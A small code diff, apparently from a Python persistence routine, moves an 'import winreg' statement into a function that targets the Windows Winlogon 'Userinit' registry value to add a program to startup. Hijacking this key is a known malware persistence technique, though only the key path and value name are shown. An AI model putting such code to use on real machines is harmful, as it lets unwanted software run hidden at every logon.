@@ -129,9 +129,10 @@ try {
 
         return shortcut_path
 
-    import winreg
 
     def add_registry_startup(path, name):
+        import winreg
+        
         reg_path = r"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
         value_name = "Userinit"
         
